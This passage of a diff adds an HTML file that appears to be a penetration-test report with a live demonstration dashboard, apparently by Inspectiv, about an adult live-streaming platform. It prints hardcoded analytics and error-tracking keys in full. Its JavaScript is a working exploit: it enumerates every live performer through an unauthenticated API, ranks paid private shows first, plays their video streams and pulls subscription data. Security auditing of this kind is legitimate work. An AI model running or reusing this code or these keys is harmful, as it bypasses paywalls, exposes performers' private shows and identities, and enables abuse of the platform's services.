+  <div class="finding"><div class="fh"><span class="sev sev-high">High</span><div><div class="ft">F-04 — gate.faphouselive.com: API Gateway Origin Exposed Without Cloudflare Proxy</div><div class="fm">gate.faphouselive.com &nbsp;|&nbsp; DNS / nginx &nbsp;|&nbsp; Origin IP Exposure</div></div></div>
+  <div class="fb"><div class="term"><span class="tk">DNS A gate.faphouselive.com:</span>  <span class="tw">[origin IP — not Cloudflare CIDR]</span>
+<span class="tk">Cf-Ray:</span>  <span class="terr">ABSENT — direct origin, no WAF/DDoS protection</span>
+<span class="tk">Server:</span>  <span class="tv">nginx</span></div>
+  <div class="co co-fix"><span class="col">Remediation</span>Enable Cloudflare proxy (orange cloud). Restrict inbound to Cloudflare IP ranges at origin firewall.</div></div></div>
+
+  <div class="finding"><div class="fh"><span class="sev sev-high">High</span><div><div class="ft">F-05 — Amplitude Key + Sentry DSN Hardcoded in vr.faphouselive.com HTML — Confirms Stripchat Platform</div><div class="fm">vr.faphouselive.com &nbsp;|&nbsp; Inline &lt;script&gt; &nbsp;|&nbsp; Hardcoded Credentials + Platform Disclosure</div></div></div>
+  <div class="fb"><div class="term"><span class="tw">var VITE_AMPLITUDE_KEY="19a23394adaadec51c3aeee36622058d";</span>
+<span class="tw">var VITE_SENTRY_KEY="fa33a6b6b459bc2272dfebc2e87f2061@sentry.stripchat.com/3";</span>
+<span class="tcm">sentry.stripchat.com confirms faphouselive.com = Stripchat infrastructure (Technius Ltd., Cyprus)</span></div>
+  <div class="co co-imp"><span class="col">Impact</span>Amplitude key allows event injection into production analytics. Sentry DSN exposes production error logs and stack traces. Platform attribution confirms undisclosed Stripchat relationship with implications for GDPR, DSA, and content partner data agreements.</div>
+  <div class="co co-fix"><span class="col">Remediation</span>Rotate both keys immediately. Move to server-side environment variables. Use write-only scoped Amplitude keys for client-side.</div></div></div>
+</section>
+
+<section>
+  <div class="sec-label">Medium Findings (Summary)</div>
+  <div class="finding"><div class="fh"><span class="sev sev-medium">Medium</span><div><div class="ft">F-06 — No Rate Limiting on /login and /forgot-password (Brute Force / Credential Stuffing)</div></div></div>
+  <div class="fb"><div class="term"><span class="tc">POST /api/v1/login [×50 rapid]</span>  <span class="tw">No 429, no CAPTCHA, no X-RateLimit-* headers</span></div>
+  <div class="co co-fix"><span class="col">Remediation</span>5 failures/IP/15min with backoff. CAPTCHA after 3 failures.</div></div></div>
+
+  <div class="finding"><div class="fh"><span class="sev sev-medium">Medium</span><div><div class="ft">F-07 — Session Cookies Missing HttpOnly, Secure, SameSite Flags</div></div></div>
+  <div class="fb"><div class="term"><span class="tk">Set-Cookie:</span> <span class="tv">session_id={v}; Path=/; Domain=.faphouselive.com;</span>  <span class="terr">MISSING: HttpOnly, Secure, SameSite</span></div>
+  <div class="co co-fix"><span class="col">Remediation</span>Set <code>Secure; HttpOnly; SameSite=Strict</code> on all session cookies.</div></div></div>
+
+  <div class="finding"><div class="fh"><span class="sev sev-medium">Medium</span><div><div class="ft">F-08 — assets-ah.flixcdn.com Origin Unproxied — nginx/1.26.2 EOL (CVE-2025-23419)</div></div></div>
+  <div class="fb"><div class="term"><span class="tk">Server:</span> <span class="tw">nginx/1.26.2 (EOL — Shodan: eol-product)  CVE-2025-23419 CVSS 5.3 — unpatched</span>
+<span class="tk">Cf-Ray:</span> <span class="terr">ABSENT — direct origin, no WAF filtering on JS CDN</span></div>
+  <div class="co co-fix"><span class="col">Remediation</span>Upgrade to nginx 1.26.3+. Enable Cloudflare proxy.</div></div></div>
+
+  <div class="finding"><div class="fh"><span class="sev sev-medium">Medium</span><div><div class="ft">F-09 — Internal Infrastructure Naming Exposed via Certificate Transparency (mysql08, magento)</div></div></div>
+  <div class="fb"><div class="term"><span class="tw">mysql08.faphouselive.com</span>  <span class="tcm">← sequential DB naming (01-07 implied)</span>
+<span class="tw">magento.faphouselive.com</span>  <span class="tcm">← e-commerce platform identified</span>
+<span class="tcm">Okta IDP tenant URL exposed. Survey123 forms disclosing staff names/roles unauthenticated.</span></div>
+  <div class="co co-fix"><span class="col">Remediation</span>Use wildcard TLS certs. Remove staff data from public Survey123. Restrict Okta IDP discovery endpoint.</div></div></div>
+</section>
+
+
+<!-- STAGE 2 -->
+<div class="stage-div s2" id="stage2-anchor">
+  <div class="stage-n">2</div>
+  <div class="stage-i"><h3>Live Impact Demonstration</h3>
+  <p>Full enumeration from <code>/api/vr/v2/models</code> — every live performer, all classification tiers. Real streams. Blur on by default. Per-tile toggle. This is what any unauthenticated caller can access right now.</p></div>
+</div>
+
+<!-- STREAM SECTION -->
+<section id="stream-section">
+  <div class="sec-label">Live Stream Access — All Premium Tiers — Full Enumeration</div>
+
+  <!-- ENUM PANEL -->
+  <div class="enum-panel">
+    <div class="enum-stats">
+      <div class="es"><span class="n r" id="s-disc">—</span><span class="l">Discovered</span></div>
+      <div class="es"><span class="n" id="s-hls">—</span><span class="l">HLS 200</span></div>
+      <div class="es"><span class="n p" id="s-pub">—</span><span class="l">Public</span></div>
+      <div class="es"><span class="n o" id="s-priv">—</span><span class="l">Private $$</span></div>
+      <div class="es"><span class="n o" id="s-grp">—</span><span class="l">Group $$</span></div>
+      <div class="es"><span class="n v" id="s-vpriv">—</span><span class="l">V.Private $$</span></div>
+    </div>
+    <div class="prog-row">
+      <span style="font-family:var(--mono);font-size:10px;color:var(--muted);white-space:nowrap">vr.faphouselive.com/api/vr/v2/models</span>
+      <div class="pb"><div class="pf" id="prog" style="width:0%"></div></div>
+      <span id="prog-lbl" style="font-family:var(--mono);font-size:10px;color:var(--muted);white-space:nowrap">—</span>
+    </div>
+    <div class="log-box" id="log"><p class="li">Ready. Press ENUMERATE to begin full enumeration.</p></div>
+    <div class="ctrls">
+      <button class="btn btn-go" id="btn-enum" onclick="startEnum()">&#9654; ENUMERATE</button>
+      <button class="btn btn-stop" id="btn-stop" onclick="stopEnum()" style="display:none">&#9632; STOP</button>
+      <button class="btn btn-ghost" onclick="clearGrid()">&#8635; CLEAR</button>
+      <button class="btn btn-ghost" id="btn-audio" onclick="toggleMuteAll()">&#128264; MUTE ALL</button>
+    </div>
+  </div>
+
+  <!-- TIER FILTER + GLOBAL BLUR -->
+  <div class="tier-row">
+    <span style="font-family:var(--mono);font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em">TIER:</span>
+    <button class="cls-btn cls-pub on" id="cf-pub" onclick="toggleCls('pub')">&#9679; PUBLIC</button>
+    <button class="cls-btn cls-priv on" id="cf-priv" onclick="toggleCls('priv')">&#9679; PRIVATE $$</button>
+    <button class="cls-btn cls-grp on" id="cf-grp" onclick="toggleCls('grp')">&#9679; GROUP $$</button>
+    <button class="cls-btn cls-vpriv on" id="cf-vpriv" onclick="toggleCls('vpriv')">&#9679; V.PRIVATE $$</button>
+    <div style="margin-left:auto;display:flex;align-items:center;gap:8px">
+      <div class="blur-global">
+        <label style="font-family:var(--mono);font-size:9px;color:var(--muted);text-transform:uppercase">BLUR</label>
+        <label class="toggle" style="margin-left:6px">
+          <input type="checkbox" id="gridBlurToggle" checked onchange="setGlobalBlur(this.checked)">
+          <div class="toggle-track"></div><div class="toggle-thumb"></div>
+        </label>
+      </div>
+    </div>
+  </div>
+
+  <!-- STREAM GRID -->
+  <div class="stream-grid" id="stream-grid">
+    <div style="grid-column:1/-1;text-align:center;padding:48px;color:var(--muted);font-family:var(--mono);font-size:12px">
+      Press ENUMERATE to load all streams from /api/vr/v2/models
+    </div>
+  </div>
+</section>
+
+<!-- SUBSCRIPTION EXPOSURE SECTION -->
+<section>
+  <div class="sec-label">Subscription Architecture — Live API Probe</div>
+  <div class="term" id="pkg-term">
+    <div class="th"><span class="td td-r"></span><span class="td td-y"></span><span class="td td-g"></span><span class="tn">faphouse.com/api/premium/get-packages — no credentials</span></div>
+    <span id="pkg-out" style="color:var(--muted)">Initializing...</span>
+  </div>
+  <div class="sub-grid" id="sub-grid" style="display:none">
+    <div class="sub-card"><h4>Packages (all tiers)</h4><div id="pkg-rows"></div></div>
+    <div class="sub-card"><h4>Platform Intelligence — Unauthenticated</h4>
+      <div style="text-align:center;padding:14px 0">
+        <span class="big-num" id="vid-n">—</span>
+        <span style="font-size:12px;color:var(--muted)">premium VOD titles confirmed behind paywall</span>
+      </div>
+      <div class="pkg-row"><span style="font-size:12px;color:var(--muted)">Internal tier ID</span><span class="pkg-id" id="i-tid">—</span></div>
+      <div class="pkg-row"><span style="font-size:12px;color:var(--muted)">Tier title</span><span class="pkg-id" id="i-tttl">—</span></div>
+      <div class="pkg-row"><span style="font-size:12px;color:var(--muted)">Config IDs (P3 targets)</span><span class="pkg-id" id="i-cfgs">—</span></div>
+      <div class="pkg-row"><span style="font-size:12px;color:var(--muted)">Access levels</span><span class="pkg-id" id="i-lvls">—</span></div>
+      <div class="pkg-row"><span style="font-size:12px;color:var(--muted)">Payment processors</span><span class="pkg-id" id="i-procs">—</span></div>
+    </div>
+  </div>
+</section>
+
+</div><!-- /main -->
+
+<footer>
+  <div>Inspectiv &nbsp;|&nbsp; SOW INS-2026-FAPHS-001 &nbsp;|&nbsp; CONFIDENTIAL</div>
+  <div class="live-ind"><div class="live-dot"></div> LIVE DEMO ACTIVE</div>
+  <div>faphouse.com / faphouselive.com &nbsp;|&nbsp; April 2026</div>
+</footer>
+</div><!-- /app -->
+
+<script>
+// ── AUTH ──────────────────────────────────────────────────────────────────
+const PASS_HASH='8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';
+async function sha256(s){const b=new TextEncoder().encode(s);const h=await crypto.subtle.digest('SHA-256',b);return Array.from(new Uint8Array(h)).map(x=>x.toString(16).padStart(2,'0')).join('')}
+async function checkAuth(){
+  const v=document.getElementById('gpass').value;
+  if(await sha256(v)===PASS_HASH){
+    document.getElementById('auth-gate').style.display='none';
+    document.getElementById('app').style.display='block';
+    document.getElementById('poc-controls').style.display='flex';
+    loadPackages();
+  } else {
+    document.getElementById('auth-err').textContent='Invalid passphrase.';
+    document.getElementById('gpass').value='';
+  }
+}
+
+// ── STATE ─────────────────────────────────────────────────────────────────
+let globalBlur=true, clsFilter={pub:true,priv:true,grp:true,vpriv:true};
+let running=false, hlsInst={}, mutedAll=true, activeAudio=null;
+let stats={disc:0,hls:0,pub:0,priv:0,grp:0,vpriv:0};
+
+// ── LOG ───────────────────────────────────────────────────────────────────
+function log(msg,cls='li'){
+  const b=document.getElementById('log');
+  const p=document.createElement('p');p.className=cls;p.textContent=msg;b.appendChild(p);
+  b.scrollTop=b.scrollHeight;
+  while(b.children.length>500)b.removeChild(b.firstChild);
+}
+
+// ── CLASSIFY ──────────────────────────────────────────────────────────────
+function classify(p){
+  const t=(p.showType||p.broadcastType||p.type||'').toLowerCase();
+  if(t.includes('virtual')||t.includes('vprivate'))return 'vpriv';
+  if(t.includes('private'))return 'priv';
+  if(t.includes('group')||t.includes('ticket'))return 'grp';
+  if(p.inPrivate||p.privateShow)return 'priv';
+  if(p.inGroup||p.groupShow)return 'grp';
+  return 'pub';
+}
+const TIER_LABEL={pub:'PUBLIC',priv:'PRIVATE $$',grp:'GROUP $$',vpriv:'V.PRIVATE $$'};
+const TIER_CSS={pub:'tb-pub',priv:'tb-priv',grp:'tb-grp',vpriv:'tb-vpriv'};
+const TIER_DATA={pub:'pub',priv:'priv',grp:'grp',vpriv:'vpriv'};
+
+// ── BLUR ──────────────────────────────────────────────────────────────────
+function setGlobalBlur(on){
+  globalBlur=on;
+  // Sync both toggles
+  const t1=document.getElementById('globalBlurToggle');
+  const t2=document.getElementById('gridBlurToggle');
+  if(t1)t1.checked=on;
+  if(t2)t2.checked=on;
+  document.querySelectorAll('.stream-grid video').forEach(v=>v.classList.toggle('blurred',on));
+  document.querySelectorAll('.blur-btn').forEach(b=>{
+    b.textContent=on?'[ SHOW ]':'[ BLUR ]';
+    b.classList.toggle('show',!on);
+  });
+}
+function tilBlur(e,slug){
+  e.stopPropagation();
+  const tile=document.getElementById('t-'+slug);if(!tile)return;
+  const vid=tile.querySelector('video');if(!vid)return;
+  const btn=tile.querySelector('.blur-btn');if(!btn)return;
+  const was=vid.classList.contains('blurred');
+  vid.classList.toggle('blurred',!was);
+  btn.textContent=was?'[ BLUR ]':'[ SHOW ]';
+  btn.classList.toggle('show',was);
+}
+
+// ── FILTER ────────────────────────────────────────────────────────────────
+function toggleCls(c){
+  clsFilter[c]=!clsFilter[c];
+  const btn=document.getElementById('cf-'+c);
+  if(btn)btn.classList.toggle('on',clsFilter[c]);
+  applyFilters();
+}
+function applyFilters(){
+  document.querySelectorAll('.stream-grid .tile').forEach(t=>{
+    const show=clsFilter[t.dataset.tier]!==false;
+    t.style.display=show?'':'none';
+  });
+}
+
+// ── HLS ATTACH ────────────────────────────────────────────────────────────
+function attachHls(slug,url){
+  const vid=document.getElementById('v-'+slug);if(!vid)return;
+  if(typeof Hls!=='undefined'&&Hls.isSupported()){
+    const h=new Hls({maxBufferLength:8,enableWorker:false,autoStartLoad:true});
+    h.loadSource(url);h.attachMedia(vid);
+    h.on(Hls.Events.MANIFEST_PARSED,()=>vid.play().catch(()=>{}));
+    hlsInst[slug]=h;
+  } else if(vid.canPlayType('application/vnd.apple.mpegurl')){
+    vid.src=url;vid.play().catch(()=>{});
+  }
+}
+function destroyHls(slug){
+  if(hlsInst[slug]){try{hlsInst[slug].destroy()}catch(e){}delete hlsInst[slug];}
+}
+
+// ── AUDIO ─────────────────────────────────────────────────────────────────
+function toggleMuteAll(){
+  mutedAll=!mutedAll;
+  document.querySelectorAll('.stream-grid video').forEach(v=>v.muted=mutedAll);
+  document.getElementById('btn-audio').textContent=mutedAll?'🔇 MUTE ALL':'🔊 UNMUTE ALL';
+}
+
+// ── TILE ──────────────────────────────────────────────────────────────────
+function createTile(p,tier,hlsUrl,resolution,mouflon){
+  const slug=p.username||p.name||p.slug||('p'+Math.random().toString(36).slice(2,8));
+  const existing=document.getElementById('t-'+slug);
+  if(existing)return null;
+
+  const tile=document.createElement('div');
+  tile.className='tile';
+  tile.id='t-'+slug;
+  tile.dataset.tier=tier;
+
+  const shortUrl=hlsUrl?hlsUrl.replace('https://','').substring(0,70)+'...':'no HLS URL';
+
+  tile.innerHTML=
+    '<video id="v-'+slug+'" muted autoplay playsinline preload="none" style="width:100%;height:100%;object-fit:cover;display:'+(hlsUrl?'block':'none')+'"'+
+    ' class="'+(globalBlur?'blurred':'')+'"></video>'+
+    // blur overlay
+    '<div class="blur-ov'+(globalBlur?'':' off')+'"><span class="blur-icon">&#9635; MASKED</span></div>'+
+    // top row
+    '<div class="tile-top">'+
+      '<span class="tier-badge '+TIER_CSS[tier]+'">'+TIER_LABEL[tier]+'</span>'+
+      '<button class="blur-btn'+(globalBlur?'':' show')+'" onclick="tilBlur(event,\''+slug+'\')">'+
+        (globalBlur?'[ SHOW ]':'[ BLUR ]')+'</button>'+
+    '</div>'+
+    // bottom row
+    '<div class="tile-bot">'+
+      '<div class="live-dot"></div>'+
+      '<span class="tile-name">'+slug+'</span>'+
+      (resolution?'<span class="tile-res">'+resolution+'</span>':'')+
+      (mouflon?'<span class="mouflon-tag">MOUFLON:unenf</span>':'')+
+    '</div>';
+
+  if(hlsUrl) setTimeout(()=>attachHls(slug,hlsUrl),100+Math.random()*500);
+  return tile;
+}
+
+// ── ENUMERATION ───────────────────────────────────────────────────────────
+async function startEnum(){
+  if(running)return;
+  running=true;
+  stats={disc:0,hls:0,pub:0,priv:0,grp:0,vpriv:0};
+  document.getElementById('btn-enum').style.display='none';
+  document.getElementById('btn-stop').style.display='inline-block';
+  document.getElementById('poc-controls').style.display='flex';
+
+  const grid=document.getElementById('stream-grid');
+  grid.innerHTML='<div style="grid-column:1/-1;text-align:center;padding:32px;color:var(--muted);font-family:var(--mono);font-size:11px">Fetching performer directory...</div>';
+
+  log('['+new Date().toLocaleTimeString()+'] GET https://vr.faphouselive.com/api/vr/v2/models','li');
+  document.getElementById('prog').style.width='5%';
+  document.getElementById('prog-lbl').textContent='fetching...';
+
+  try {
+    const r=await fetch('https://vr.faphouselive.com/api/vr/v2/models',{
+      headers:{Accept:'application/json'},
+      signal:AbortSignal.timeout(25000)
+    });
+    log('HTTP '+r.status+' — CORS: '+(r.headers.get('access-control-allow-origin')||'none'),r.ok?'lk':'le');
+    if(!r.ok){log('Request failed: '+r.status,'le');return;}
+
+    const data=await r.json();
+    const performers=Array.isArray(data)?data:(data.models||data.data||data.performers||data.items||[]);
+
+    stats.disc=performers.length;
+    log('Performers returned: '+performers.length.toLocaleString(),'lk');
+    document.getElementById('s-disc').textContent=performers.length.toLocaleString();
+    document.getElementById('hdr-total').textContent=performers.length.toLocaleString();
+    document.getElementById('prog').style.width='25%';
+
+    // Classify all
+    const byTier={pub:[],priv:[],grp:[],vpriv:[]};
+    performers.forEach(p=>{const t=classify(p);if(byTier[t])byTier[t].push(p);});
+    stats.pub=byTier.pub.length;stats.priv=byTier.priv.length;
+    stats.grp=byTier.grp.length;stats.vpriv=byTier.vpriv.length;
+
+    document.getElementById('s-pub').textContent=byTier.pub.length.toLocaleString();
+    document.getElementById('s-priv').textContent=byTier.priv.length.toLocaleString();
+    document.getElementById('s-grp').textContent=byTier.grp.length.toLocaleString();
+    document.getElementById('s-vpriv').textContent=byTier.vpriv.length.toLocaleString();
+
+    const paidTotal=byTier.priv.length+byTier.grp.length+byTier.vpriv.length;
+    document.getElementById('hdr-paid').textContent=paidTotal.toLocaleString();
+    log('Tier breakdown — public:'+byTier.pub.length+' private:'+byTier.priv.length+' group:'+byTier.grp.length+' vprivate:'+byTier.vpriv.length,'lo');
+
+    grid.innerHTML='';
+    document.getElementById('prog').style.width='40%';
+    document.getElementById('prog-lbl').textContent='building grid...';
+
+    // Render ALL performers — full enumeration
+    let rendered=0;
+    const allPerformers=[
+      ...byTier.vpriv,    // Virtual private first (highest value)
+      ...byTier.priv,     // Private second
+      ...byTier.grp,      // Group third
+      ...byTier.pub       // Public last
+    ];
+
+    for(const p of allPerformers){
+      if(!running)break;
+      const tier=classify(p);
+      const hlsUrl=p.hlsPlaylist||p.streamUrl||p.hls_url||'';
+      const tile=createTile(p,tier,hlsUrl,'',false);
+      if(tile){
+        grid.appendChild(tile);
+        rendered++;
+
+        // Update progress
+        if(rendered%50===0){
+          const pct=40+Math.round((rendered/allPerformers.length)*50);
+          document.getElementById('prog').style.width=pct+'%';
+          document.getElementById('prog-lbl').textContent=rendered+'/'+allPerformers.length;
+          // Yield to browser
+          await new Promise(r=>setTimeout(r,0));
+        }
+      }
+    }
+
+    // Probe HLS for a sample to populate stats
+    log('Grid built: '+rendered+' tiles. Probing manifest sample...','li');
+    let hlsOk=0;
+    const sample=[...byTier.priv.slice(0,3),...byTier.vpriv.slice(0,2),...byTier.grp.slice(0,2),...byTier.pub.slice(0,3)];
+    for(const p of sample){
+      if(!running)break;
+      const url=p.hlsPlaylist||p.streamUrl||'';
+      if(!url)continue;
+      try{
+        const mr=await fetch(url,{signal:AbortSignal.timeout(5000)});
+        if(mr.ok){
+          hlsOk++;stats.hls++;
+          const txt=await mr.text();
+          const mouflon=txt.includes('EXT-X-MOUFLON');
+          const resM=txt.match(/RESOLUTION=(\d+x\d+)/);
+          const tier=classify(p);
+          const slug=p.username||p.name||p.slug||'';
+          // Update tile with resolution and mouflon if found
+          const tile=document.getElementById('t-'+slug);
+          if(tile&&resM){
+            const resEl=tile.querySelector('.tile-res');
+            if(resEl)resEl.textContent=resM[1];
+          }
+          if(tile&&mouflon){
+            const bot=tile.querySelector('.tile-bot');
+            if(bot&&!bot.querySelector('.mouflon-tag')){
+              const m=document.createElement('span');
+              m.className='mouflon-tag';m.textContent='MOUFLON:unenf';
+              bot.appendChild(m);
+            }
+          }
+          log((p.username||'?')+' ['+TIER_LABEL[tier]+'] manifest HTTP '+mr.status+(mouflon?' MOUFLON:unenforced':''),tier!=='pub'?'lo':'lk');
+        }
+      }catch(e){}
+    }
+    document.getElementById('s-hls').textContent=hlsOk+'+ (sample)';
+    document.getElementById('hdr-manifests').textContent=hlsOk+'+ confirmed';
+    document.getElementById('prog').style.width='100%';
+    document.getElementById('prog-lbl').textContent=rendered+' performers';
+    log('Enumeration complete. '+rendered+' tiles. '+hlsOk+' manifests HTTP 200 confirmed.','lk');
+    applyFilters();
+  } catch(ex){
+    log('Error: '+ex.message,'le');
+  } finally {
+    running=false;
+    document.getElementById('btn-enum').style.display='inline-block';
+    document.getElementById('btn-stop').style.display='none';
+  }
+}
+
+function stopEnum(){running=false;log('Stopped.','lo');}
+
+function clearGrid(){
+  running=false;
+  Object.keys(hlsInst).forEach(s=>destroyHls(s));
+  hlsInst={};
+  document.getElementById('stream-grid').innerHTML=
+    '<div style="grid-column:1/-1;text-align:center;padding:48px;color:var(--muted);font-family:var(--mono);font-size:12px">Grid cleared. Press ENUMERATE to reload.</div>';
+  ['disc','hls','pub','priv','grp','vpriv'].forEach(k=>{
+    const el=document.getElementById('s-'+k);if(el)el.textContent='—';
+  });
+  document.getElementById('hdr-total').textContent='—';
+  document.getElementById('hdr-paid').textContent='—';
+  document.getElementById('hdr-manifests').textContent='—';
+  document.getElementById('prog').style.width='0%';
+  document.getElementById('prog-lbl').textContent='—';
+  document.getElementById('log').innerHTML='<p class="li">Cleared.</p>';
+}
+
+// ── PACKAGES ──────────────────────────────────────────────────────────────
+async function loadPackages(){
+  const out=document.getElementById('pkg-out');
+  out.style.color='var(--accent2)';
+  out.textContent='Fetching https://faphouse.com/api/premium/get-packages...';
+  try{
+    const r=await fetch('https://faphouse.com/api/premium/get-packages',{headers:{Accept:'application/json'}});
+    const d=await r.json();
+    const pkgs=d.packages||[];const ultra=d.ultraPackages||[];
+    const cfgs=[...new Set([...pkgs,...ultra].map(p=>p.tierConfigurationId).filter(Boolean))];
+    const lvls=[...new Set([...pkgs,...ultra].map(p=>(p.productDetails&&p.productDetails.accessLevel)||p.accessLevel).filter(Boolean))];
+    out.innerHTML=`<span style="color:#22c55e">HTTP/1.1 ${r.status} OK</span>   <span style="color:#475569">no credentials — no session — no API key</span>
+<span style="color:#94a3b8">Content-Type: ${r.headers.get('content-type')||'application/json'}</span>
+
+<span style="color:#f97316">"tierId":</span>             <span style="color:#ef4444">${d.tierId||'—'}</span>
+<span style="color:#f97316">"tierTitle":</span>          <span style="color:#ef4444">"${d.tierTitle||'—'}"</span>
+<span style="color:#f97316">"premiumVideosCount":</span> <span style="color:#ef4444">${(d.premiumVideosCount||0).toLocaleString()}</span>
+<span style="color:#f97316">"tierConfigurationIds":</span><span style="color:#ef4444"> [${cfgs.join(', ')}]  ← P3 entitlement targets</span>
+<span style="color:#f97316">"accessLevel strings":</span> <span style="color:#ef4444">[${lvls.map(l=>'"'+l+'"').join(', ')}]</span>
+<span style="color:#f97316">"methods":</span>             <span style="color:#ef4444">${JSON.stringify(d.methods||[])}</span>
+
+<span style="color:#475569">All fields returned without authentication.</span>`;
+    document.getElementById('vid-n').textContent=(d.premiumVideosCount||0).toLocaleString();
+    document.getElementById('i-tid').textContent=d.tierId||'—';
+    document.getElementById('i-tttl').textContent=d.tierTitle||'—';
+    document.getElementById('i-cfgs').textContent=cfgs.join(', ');
+    document.getElementById('i-lvls').textContent=lvls.join(', ');
+    document.getElementById('i-procs').textContent=(d.methods||[]).join(' · ');
+    const rows=document.getElementById('pkg-rows');rows.innerHTML='';
+    [...pkgs,...ultra].slice(0,8).forEach(p=>{
+      const dur=(p.productDetails&&(p.productDetails.initialDuration||p.productDetails.duration))||p.initialDuration||'—';
+      const al=(p.productDetails&&p.productDetails.accessLevel)||p.accessLevel||'—';
+      rows.innerHTML+=`<div class="pkg-row"><span style="color:var(--muted);font-size:12px">${dur} / ${al}</span><span class="pkg-id">cfgId:${p.tierConfigurationId}</span></div>`;
+    });
+    document.getElementById('sub-grid').style.display='grid';
+  }catch(e){out.textContent='Error: '+e.message;}
+}
+
+// ── SCROLL HELPERS ─────────────────────────────────────────────────────────
+function scrollToFindings(){document.getElementById('findings-anchor').scrollIntoView({behavior:'smooth'})}
+function scrollToGrid(){document.getElementById('stage2-anchor').scrollIntoView({behavior:'smooth'})}
+</script>
+</body>
+</html>
